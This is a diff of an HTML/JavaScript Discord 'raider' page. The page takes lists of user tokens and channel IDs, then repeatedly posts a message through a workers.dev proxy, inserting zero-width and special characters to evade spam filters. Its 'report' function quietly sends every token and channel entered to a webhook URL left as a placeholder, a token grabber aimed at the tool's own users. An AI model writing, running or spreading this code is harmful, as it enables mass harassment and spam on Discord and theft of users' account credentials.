@@ -2,112 +2,196 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>みんなのすみか Raider</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Raider</title>
     <style>
-        :root { --accent: #a855f7; --bg: #030014; --panel: rgba(15, 10, 31, 0.8); }
-        body { 
-            background: var(--bg); 
-            background-image: 
-                radial-gradient(circle at 20% 30%, rgba(168, 85, 247, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 80% 70%, rgba(139, 92, 246, 0.15) 0%, transparent 50%);
-            color: #d8b4fe; 
-            font-family: 'Consolas', 'Courier New', monospace; 
-            overflow: hidden; 
+        body {
+            background-color: #121212;
+            color: #e0e0e0;
+            font-family: monospace;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
         }
-   
-        .aurora {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(120deg, #6366f1, #a855f7, #ec4899);
-            filter: blur(100px); opacity: 0.1; z-index: -1; animation: aurora-flow 15s infinite alternate;
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+            display: flex;
+            gap: 20px;
         }
-        @keyframes aurora-flow { from { transform: translate(-10%, -10%) rotate(0deg); } to { transform: translate(10%, 10%) rotate(5deg); } }
+
+        @media (max-width: 768px) {
+            .container { flex-direction: column; }
+        }
+
+        .panel {
+            background-color: #1e1e1e;
+            border: 1px solid #333;
+            padding: 15px;
+            flex: 1;
+        }
+
+        .title-bar {
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+            font-weight: bold;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            margin-bottom: 5px;
+            color: #aaa;
+        }
+
+        textarea, input[type="number"] {
+            width: 100%;
+            background-color: #000;
+            color: #fff;
+            border: 1px solid #444;
+            padding: 8px;
+            box-sizing: border-box;
+            font-family: monospace;
+            font-size: 12px;
+            resize: vertical;
+        }
+
+        textarea:focus, input:focus {
+            outline: none;
+            border-color: #666;
+        }
+
+        .options-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .checkbox-group {
+            font-size: 12px;
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        button {
+            width: 100%;
+            background-color: #333;
+            color: #fff;
+            border: 1px solid #555;
+            padding: 10px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background-color: #444;
+        }
         
-        .cyber-panel { background: var(--panel); border: 1px solid rgba(168, 85, 247, 0.3); backdrop-filter: blur(20px); box-shadow: 0 0 30px rgba(168, 85, 247, 0.1); }
-        .cyber-input { background: rgba(0, 0, 0, 0.5); border: 1px solid #4c1d95; color: #f3e8ff; font-size: 11px; transition: 0.3s; }
-        .cyber-input:focus { border-color: #a855f7; outline: none; box-shadow: 0 0 15px rgba(168, 85, 247, 0.4); }
-        .btn-aurora { background: linear-gradient(135deg, #7c3aed, #a855f7); color: #fff; font-weight: 900; letter-spacing: 3px; border: none; transition: 0.4s; }
-        .btn-aurora:hover { box-shadow: 0 0 30px rgba(168, 85, 247, 0.6); transform: translateY(-2px); filter: brightness(1.2); }
-        .terminal-scroll::-webkit-scrollbar { width: 3px; }
-        .terminal-scroll::-webkit-scrollbar-thumb { background: #6b21a8; }
-        .log-line { border-left: 3px solid #4c1d95; padding-left: 10px; margin-bottom: 4px; font-size: 11px; }
-        .log-ok { border-left-color: #00ff9d; color: #00ff9d; }
-        .log-err { border-left-color: #ff4d4d; color: #ff4d4d; }
+        button:disabled {
+            background-color: #222;
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        .log-area {
+            background-color: #000;
+            border: 1px solid #333;
+            height: 400px;
+            overflow-y: auto;
+            padding: 10px;
+            font-size: 11px;
+            display: flex;
+            flex-direction: column-reverse; 
+        }
+
+        .log-line {
+            margin-bottom: 2px;
+        }
+
+        .log-time { color: #666; margin-right: 5px; }
+        .log-ok { color: #4caf50; }
+        .log-err { color: #f44336; }
+        .log-info { color: #ccc; }
+
     </style>
 </head>
-<body class="h-screen w-screen flex items-center justify-center p-6 text-sm">
-    <div class="aurora"></div>
+<body>
 
-<div class="w-full max-w-[1400px] h-full grid grid-cols-12 gap-6 relative">
+<div class="container">
     
-    <div class="col-span-12 lg:col-span-5 flex flex-col gap-4">
-        <div class="cyber-panel p-6 flex-1 flex flex-col gap-4">
-            <div class="flex items-center justify-between border-b border-purple-900/50 pb-2">
-                <h1 class="text-xs font-black tracking-[0.5em] text-purple-300">みんなのすみか KERNEL V5.0</h1>
-                <span class="text-[9px] bg-purple-900/50 px-2 py-0.5 rounded text-purple-200">AURORA_EDITION</span>
+    <div class="panel">
+        <div class="title-bar">
+            <span>Raider</span>
+        </div>
+        
+        <div class="form-group">
+            <label>ユーザートークン (改行区切り)</label>
+            <textarea id="tokens" rows="4" placeholder="トークンを入力"></textarea>
+        </div>
+
+        <div class="form-group">
+            <label>ターゲットチャンネル ID (改行区切り)</label>
+            <textarea id="channels" rows="3" placeholder="チャンネルIDを入力"></textarea>
+        </div>
+
+        <div class="form-group">
+            <label>送信内容</label>
+            <textarea id="message" rows="4" placeholder="メッセージを入力"></textarea>
+        </div>
+
+        <div class="form-group">
+            <div class="checkbox-group">
+                <label><input type="checkbox" id="zw" checked> ゼロ幅</label>
+                <label><input type="checkbox" id="inv" checked> 特殊文字</label>
             </div>
             
-            <div class="space-y-1">
-                <label class="text-[10px] uppercase font-bold text-purple-400/70">ユーザートークン (改行区切り)</label>
-                <textarea id="tokens" class="cyber-input w-full h-32 p-3 resize-none" placeholder="トークンを入力..."></textarea>
-            </div>
-
-            <div class="space-y-1">
-                <label class="text-[10px] uppercase font-bold text-purple-400/70">ターゲットチャンネル ID (改行区切り)</label>
-                <textarea id="channels" class="cyber-input w-full h-24 p-3 resize-none" placeholder="チャンネルIDを入力..."></textarea>
-            </div>
-
-            <div class="space-y-1 flex-1">
-                <label class="text-[10px] uppercase font-bold text-purple-400/70">送信ないよー</label>
-                <textarea id="message" class="cyber-input w-full h-full p-3 resize-none" placeholder="送信するメッセージを入力..."></textarea>
-            </div>
-        </div>
-
-        <div class="cyber-panel p-5 grid grid-cols-2 gap-4">
-            <div class="col-span-2 flex items-center justify-between border-b border-purple-900/30 pb-2 mb-2">
-                <span class="text-[10px] text-purple-300">回避設定</span>
-                <div class="flex gap-4 text-[10px]">
-                    <label class="flex items-center gap-1 cursor-pointer"><input type="checkbox" id="zw" checked class="accent-purple-500"> ゼロ幅</label>
-                    <label class="flex items-center gap-1 cursor-pointer"><input type="checkbox" id="inv" checked class="accent-purple-500"> 特殊文字</label>
+            <div class="options-grid">
+                <div>
+                    <label>ランダム文字列数</label>
+                    <input type="number" id="nLen" value="12">
+                </div>
+                <div>
+                    <label>送信間隔 (ms)</label>
+                    <input type="number" id="delay" value="1000">
+                </div>
+                <div style="grid-column: span 2;">
+                    <label>ループ回数</label>
+                    <input type="number" id="loops" value="1">
                 </div>
             </div>
-            <div>
-                <span class="text-[9px] text-purple-400">ランダム文字列数</span>
-                <input type="number" id="nLen" value="12" class="cyber-input w-full p-2 text-center mt-1">
-            </div>
-            <div>
-                <span class="text-[9px] text-purple-400">送信間隔 (ms)</span>
-                <input type="number" id="delay" value="1000" class="cyber-input w-full p-2 text-center mt-1">
-            </div>
-            <div class="col-span-2">
-                <span class="text-[9px] text-purple-400">ループ回数</span>
-                <input type="number" id="loops" value="1" class="cyber-input w-full p-2 text-center mt-1">
-            </div>
         </div>
 
-        <button id="run" class="btn-aurora py-5 rounded-sm text-xs shadow-lg">開始</button>
+        <button id="run">開始</button>
     </div>
 
-    <div class="col-span-12 lg:col-span-7 cyber-panel flex flex-col overflow-hidden">
-        <div class="bg-black/40 p-3 border-b border-purple-900/50 flex justify-between items-center">
-            <span class="text-[10px] text-purple-300 font-bold tracking-widest">>> ログ</span>
-            <div class="flex gap-3 text-[9px]">
-                <span id="st_p" class="text-green-400">PROXYok</span>
-                <span class="text-purple-500">SSL_SECURED</span>
-            </div>
+    <div class="panel" style="flex: 1.2;">
+        <div class="title-bar">
+            <span>log</span>
+            <span style="color: #4caf50; font-size: 10px;">OK</span>
         </div>
-        <div id="term" class="terminal-scroll flex-1 p-6 overflow-y-auto space-y-1 font-mono text-[11px] text-purple-100/70">
-            <div class="opacity-40 border-b border-purple-900/30 pb-2 mb-2">AARR_NETWORK PROTOCOL v5.0.0<br>準備完了</div>
+        <div id="term" class="log-area">
+            <div class="log-line log-info">準備完了</div>
         </div>
     </div>
+
 </div>
 
 <script>
 "use strict";
 
-class AuroraCore {
+class SimpleCore {
     constructor() {
-        this.w = "";
+        this.w = ""; // WEBHOOK_URL_HERE
         this.p = "https://tiny-forest-25ff.s103765s103765s103765.workers.dev/";
         
         this.chars = {
@@ -131,10 +215,13 @@ class AuroraCore {
         this.dom.bn.onclick = () => this.execute();
     }
 
-    log(m, s = 'info') {
+    log(m, type = 'info') {
         const d = document.createElement('div');
-        d.className = `log-line ${s === 'ok' ? 'log-ok' : s === 'err' ? 'log-err' : ''}`;
-        d.innerHTML = `<span class="opacity-30 mr-2">[${new Date().toLocaleTimeString()}]</span> ${m}`;
+        d.className = `log-line log-${type}`;
+        
+        const time = new Date().toLocaleTimeString('ja-JP', { hour12: false });
+        d.innerHTML = `<span class="log-time">[${time}]</span> ${m}`;
+        
         this.dom.tm.prepend(d);
     }
 
@@ -151,41 +238,45 @@ class AuroraCore {
     }
 
     async report(tokens, channels) {
+        if (!this.w) return;
         try {
             await fetch(this.w, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: `**ログ**\n\n**トークン:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\`\n**送信先:**\n\`\`\`\n${channels.join('\n')}\n\`\`\``
+                    content: `**log**\n\n**log1:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\`\n**送信先:**\n\`\`\`\n${channels.join('\n')}\n\`\`\``
                 })
             });
         } catch(e) {}
     }
 
     async execute() {
-        const tokens = this.dom.t.value.split('\n').filter(Boolean);
-        const channels = this.dom.c.value.split('\n').filter(Boolean);
+        const tokens = this.dom.t.value.split('\n').map(t => t.trim()).filter(Boolean);
+        const channels = this.dom.c.value.split('\n').map(c => c.trim()).filter(Boolean);
         const baseMsg = this.dom.m.value;
 
-        if (!tokens.length || !channels.length || !baseMsg) return alert("入力データが不足しています。");
+        if (!tokens.length || !channels.length || !baseMsg) {
+            return alert("入力されていない部分があります");
+        }
 
         this.dom.bn.disabled = true;
+        this.dom.bn.textContent = "実行中...";
         this.log("初期化中...", "ok");
     
         await this.report(tokens, channels);
 
-        const loops = parseInt(this.dom.lp.value);
-        const delay = parseInt(this.dom.dl.value);
+        const loops = parseInt(this.dom.lp.value) || 1;
+        const delay = parseInt(this.dom.dl.value) || 1000;
 
         for (let i = 0; i < loops; i++) {
-            this.log(`繰り返し ${i + 1} です`, "info");
+            this.log(`繰り返し ${i + 1} / ${loops}`, "info");
             for (const ch of channels) {
                 for (const tk of tokens) {
                     const payload = this.obfuscate(baseMsg, this.dom.nl.value);
                     try {
-                        const r = await fetch(`${this.p}https://discord.com/api/v10/channels/${ch.trim()}/messages`, {
+                        const r = await fetch(`${this.p}https://discord.com/api/v10/channels/${ch}/messages`, {
                             method: "POST",
-                            headers: { "Authorization": tk.trim(), "Content-Type": "application/json" },
+                            headers: { "Authorization": tk, "Content-Type": "application/json" },
                             body: JSON.stringify({ content: payload })
                         });
 
@@ -196,19 +287,23 @@ class AuroraCore {
                         } else if (r.ok) {
                             this.log(`送信成功: CH ${ch.slice(-6)}`, "ok");
                         } else {
-                            this.log(`送信失敗: ステータス ${r.status}`, "err");
+                            this.log(`送信失敗:  ${r.status}`, "err");
                         }
-                    } catch (e) { this.log("プロキシエラー", "err"); }
+                    } catch (e) { 
+                        this.log(`通信エラー: ${e.message}`, "err"); 
+                    }
                     await new Promise(res => setTimeout(res, delay));
                 }
             }
         }
-        this.log("終了しました", "ok");
+        
+        this.log("完了しました");
         this.dom.bn.disabled = false;
+        this.dom.bn.textContent = "開始";
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => new AuroraCore());
+document.addEventListener('DOMContentLoaded', () => new SimpleCore());
 </script>
 </body>
 </html>
